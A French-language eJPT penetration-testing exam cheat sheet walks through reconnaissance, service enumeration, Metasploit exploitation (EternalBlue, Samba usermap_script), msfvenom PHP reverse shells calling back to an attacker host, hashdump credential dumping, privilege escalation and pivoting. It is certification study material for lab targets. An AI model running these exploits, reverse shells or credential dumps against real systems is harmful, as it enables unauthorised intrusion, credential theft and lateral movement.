# 🎯 eJPT - Méthodologie complète de A à Z

## 🚀 Phase 1: Reconnaissance initiale

### 1.1 Découverte d'hôtes
| Outil | Commande | Objectif |
|-------|----------|----------|
| **Nmap** | `nmap -sn 192.168.1.0/24` | Ping sweep - hôtes actifs |
| **Metasploit** | `use auxiliary/scanner/discovery/ping_sweep` | Alternative MSF |
| **Fping** | `fping -g 192.168.1.0/24` | Ping rapide sur réseau |

**➡️ Résultat attendu :** Liste des IPs actives

---

## 🔍 Phase 2: Scan de ports et services

### 2.1 Scan de ports
| Type de scan | Commande | Usage |
|--------------|----------|-------|
| **Rapide** | `nmap -F target` | Top 100 ports |
| **Complet** | `nmap -p- target` | Tous les ports (1-65535) |
| **Service detection** | `nmap -sV -sC target` | Versions + scripts par défaut |
| **OS detection** | `nmap -O target` | Détection OS |
| **Agressif** | `nmap -A target` | Tout combiné |

### 2.2 Avec Metasploit
```bash
# Setup initial
msfconsole -q
workspace -a ejpt_target
setg RHOSTS target_ip

# Scan et sauvegarde en base
db_nmap -sV -sC -O target_ip
hosts
services
```

**➡️ Résultat attendu :** Liste des ports ouverts et services identifiés

---

## 🎯 Phase 3: Énumération par service

### 3.1 Si port 21 (FTP) détecté

#### 🔍 Détection
```bash
# Nmap
nmap -p21 -sV --script ftp-* target

# Metasploit
use auxiliary/scanner/ftp/ftp_version
set RHOSTS target
run
```

#### ⚔️ Exploitation potentielle
| Vulnérabilité | Action |
|---------------|--------|
| **Anonymous login** | `ftp target` → anonymous:anonymous |
| **ProFTPD 1.3.5** | `use exploit/unix/ftp/proftpd_modcopy_exec` |
| **vsftpd 2.3.4** | `use exploit/unix/ftp/vsftpd_234_backdoor` |
| **Brute force** | `use auxiliary/scanner/ftp/ftp_login` |

---

### 3.2 Si port 22 (SSH) détecté

#### 🔍 Détection
```bash
# Nmap
nmap -p22 -sV --script ssh-* target

# Metasploit
use auxiliary/scanner/ssh/ssh_version
set RHOSTS target
run
```

#### ⚔️ Exploitation potentielle
| Vulnérabilité | Action |
|---------------|--------|
| **Weak passwords** | `use auxiliary/scanner/ssh/ssh_login` |
| **User enumeration** | `use auxiliary/scanner/ssh/ssh_enumusers` |
| **Key-based auth** | Rechercher clés privées exposées |
| **LibSSH CVE-2018-10933** | `use exploit/linux/ssh/libssh_auth_bypass` |

---

### 3.3 Si port 139/445 (SMB) détecté ⭐ TRÈS IMPORTANT

#### 🔍 Détection
```bash
# Énumération complète SMB
enum4linux target
smbclient -L target
smbmap -H target

# Metasploit - SÉQUENCE OBLIGATOIRE
use auxiliary/scanner/smb/smb_version
set RHOSTS target
run

use auxiliary/scanner/smb/smb_enumshares  
run

use auxiliary/scanner/smb/smb_enumusers
run

# CHECK ETERNALBLUE - ESSENTIEL
use auxiliary/scanner/smb/smb_ms17_010
run
```

#### ⚔️ Exploitation selon version
| Détection | Exploit à utiliser |
|-----------|-------------------|
| **Windows 7/8/10/2016** + MS17-010 | `use exploit/windows/smb/ms17_010_eternalblue` |
| **Windows XP/2003** | `use exploit/windows/smb/ms08_067_netapi` |
| **Windows Vista/7/2008** | `use exploit/windows/smb/ms09_050_smb2_negotiate_func_index` |
| **Samba 3.0.20-3.0.25rc3** | `use exploit/multi/samba/usermap_script` |
| **Null sessions** | `rpcclient -U "" target` |

**🔥 Workflow EternalBlue (très fréquent eJPT) :**
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target
set LHOST attacker_ip
check  # Vérifier si vulnérable
exploit
```

---

### 3.4 Si port 80/443 (HTTP/HTTPS) détecté ⭐ TRÈS IMPORTANT

#### 🔍 Détection
```bash
# Énumération web
whatweb target
curl -I http://target

# Gobuster/Dirb
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt
dirb http://target

# Metasploit
use auxiliary/scanner/http/http_version
set RHOSTS target
run

use auxiliary/scanner/http/dir_scanner
set RHOSTS target
set DICTIONARY /usr/share/metasploit-framework/data/wordlists/directory.txt
run
```

#### ⚔️ Exploitation selon technologie
| Technologie détectée | Actions |
|---------------------|---------|
| **Apache** | `nikto -h target`, recherche CVE version |
| **IIS** | `use auxiliary/scanner/http/iis_shortname_scanner` |
| **WordPress** | `use auxiliary/scanner/http/wordpress_scanner` |
| **Joomla** | `use auxiliary/scanner/http/joomla_scanner` |
| **Tomcat** | `use auxiliary/scanner/http/tomcat_mgr_login` |
| **File upload** | Tester upload de shells |
| **SQL injection** | `sqlmap -u "http://target/page.php?id=1"` |

**🔥 Upload de shell commun :**
```bash
# Si upload de fichiers trouvé
# Créer un shell PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f raw > shell.php

# Setup handler
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST attacker_ip
set LPORT 4444
exploit
```

---

### 3.5 Si port 3306 (MySQL) détecté

#### 🔍 Détection
```bash
# Metasploit
use auxiliary/scanner/mysql/mysql_version
set RHOSTS target
run
```

#### ⚔️ Exploitation
| Action | Commande |
|--------|----------|
| **Brute force** | `use auxiliary/scanner/mysql/mysql_login` |
| **Weak passwords** | Tester root:root, root:"", admin:admin |
| **SQL execution** | `use auxiliary/admin/mysql/mysql_sql` |

---

### 3.6 Si port 25/587 (SMTP) détecté

#### 🔍 Détection
```bash
use auxiliary/scanner/smtp/smtp_version
set RHOSTS target
run

use auxiliary/scanner/smtp/smtp_enum
set RHOSTS target
run
```

#### ⚔️ Exploitation
- **User enumeration** : VRFY, EXPN commands
- **Open relay test** : `use auxiliary/scanner/smtp/smtp_relay`

---

## 💥 Phase 4: Exploitation

### 4.1 Windows - Workflow standard

#### Si SMB vulnérable (EternalBlue)
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target
set LHOST attacker_ip
check
exploit

# Si succès → session Meterpreter
sysinfo
getuid
```

#### Si web application vulnérable
```bash
# Upload shell PHP
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST attacker_ip
set LPORT 4444
exploit

# Dans un autre terminal, uploader le shell sur l'app web
```

### 4.2 Linux - Workflow standard

#### Si Samba vulnérable
```bash
use exploit/multi/samba/usermap_script
set RHOSTS target
set LHOST attacker_ip
exploit

# Si succès → shell Linux
```

#### Si SSH avec credentials faibles
```bash
# Après brute force réussi
ssh user@target
# Puis escalation de privilèges
```

---

## 🚀 Phase 5: Post-exploitation

### 5.1 Windows - Énumération post-compromise

#### Dans Meterpreter
```bash
# Informations de base
sysinfo
getuid
getprivs

# Dump credentials
hashdump
run post/windows/gather/credentials/windows_autologin

# Recherche d'escalation
run post/multi/recon/local_exploit_suggester

# Énumération utilisateurs
run post/windows/gather/enum_logged_on_users

# Processus pour migration
ps
migrate <pid_explorer>
```

#### Escalation de privilèges Windows
| Technique | Commande |
|-----------|----------|
| **Local exploit suggester** | `run post/multi/recon/local_exploit_suggester` |
| **Token stealing** | `steal_token <pid>` |
| **Getsystem** | `getsystem` |
| **Exploit local** | Selon suggestion (MS16-032, etc.) |

### 5.2 Linux - Énumération post-compromise

#### Énumération de base
```bash
# Informations système
uname -a
id
sudo -l

# Recherche SUID
find / -perm -4000 2>/dev/null

# LinPEAS si disponible
./linpeas.sh
```

#### Escalation de privilèges Linux
| Technique | Action |
|-----------|--------|
| **SUID exploitation** | `find / -perm -4000 2>/dev/null` puis GTFOBins |
| **Sudo misconfiguration** | `sudo -l` puis exploitation |
| **Kernel exploits** | Selon version (Dirty COW, etc.) |
| **Writable files** | `/etc/passwd`, scripts cron |

---

## 🎯 Phase 6: Pivoting et mouvement latéral

### 6.1 Découverte réseau interne
```bash
# Dans Meterpreter
ipconfig
route
arp

# Ajouter routes pour pivoting
run autoroute -s 192.168.2.0/24

# Port scanning interne
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.2.0/24
set PORTS 22,80,135,139,445
run
```

### 6.2 Credential reuse
```bash
# Utiliser credentials récupérés sur autres machines
use exploit/windows/smb/psexec
set RHOSTS new_target
set SMBUser administrator
set SMBPass password_found
exploit
```

---

## 📋 Checklist par scénario

### 🔥 Scénario 1: Machine Windows avec SMB
1. ✅ `nmap -sV -sC target`
2. ✅ `use auxiliary/scanner/smb/smb_ms17_010`
3. ✅ Si vulnérable → `use exploit/windows/smb/ms17_010_eternalblue`
4. ✅ Meterpreter → `sysinfo`, `getuid`, `hashdump`
5. ✅ `run post/multi/recon/local_exploit_suggester`
6. ✅ Escalation si nécessaire

### 🔥 Scénario 2: Application web
1. ✅ `gobuster dir -u http://target -w common.txt`
2. ✅ Identifier technologie (WordPress, upload, etc.)
3. ✅ Exploitation selon vulnérabilité
4. ✅ Upload shell → Handler Metasploit
5. ✅ Énumération système post-compromise

### 🔥 Scénario 3: Machine Linux avec services
1. ✅ `nmap -sV -sC target`
2. ✅ Énumération services (SSH, FTP, Samba)
3. ✅ Brute force ou exploit selon service
4. ✅ Shell → `uname -a`, `sudo -l`, `find / -perm -4000`
5. ✅ LinPEAS ou escalation manuelle

---

## ⚡ Commandes rapides par situation

### 🚨 Si machine Windows trouvée
```bash
# One-liner rapide
nmap -sV target && msfconsole -x "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS target; run; use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS target; set LHOST attacker_ip; exploit"
```

### 🚨 Si service web trouvé
```bash
# Énumération web rapide
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
nikto -h http://target
```

### 🚨 Si machine Linux trouvée
```bash
# Après compromise
uname -a && id && sudo -l && find / -perm -4000 2>/dev/null
```

---

## 🎯 Points critiques pour l'eJPT

### ⭐ Services les plus exploités
1. **SMB (445)** - EternalBlue très fréquent
2. **HTTP (80)** - Upload shells, SQLi
3. **FTP (21)** - Anonymous, ProFTPD
4. **SSH (22)** - Brute force, weak passwords

### ⭐ Exploits incontournables
- `ms17_010_eternalblue` (Windows)
- `usermap_script` (Samba Linux)
- Upload shells web
- Brute force SSH/FTP

### ⭐ Post-exploitation essentiels
- `hashdump` (Windows)
- `local_exploit_suggester` (Windows/Linux)
- Migration de processus (Windows)
- Recherche SUID (Linux)

---

## 🔧 Setup initial recommandé

### Variables globales Metasploit
```bash
msfconsole -q
workspace -a ejpt_exam
setg LHOST your_ip
setg LPORT 4444
```

### Wordlists essentielles
- `/usr/share/wordlists/dirb/common.txt`
- `/usr/share/wordlists/rockyou.txt`
- `/usr/share/metasploit-framework/data/wordlists/`

**🎯 Rappel final :** L'eJPT privilégie SMB (EternalBlue), applications web, et l'utilisation intensive de Metasploit. Focus sur ces trois points pour maximiser tes chances de réussite !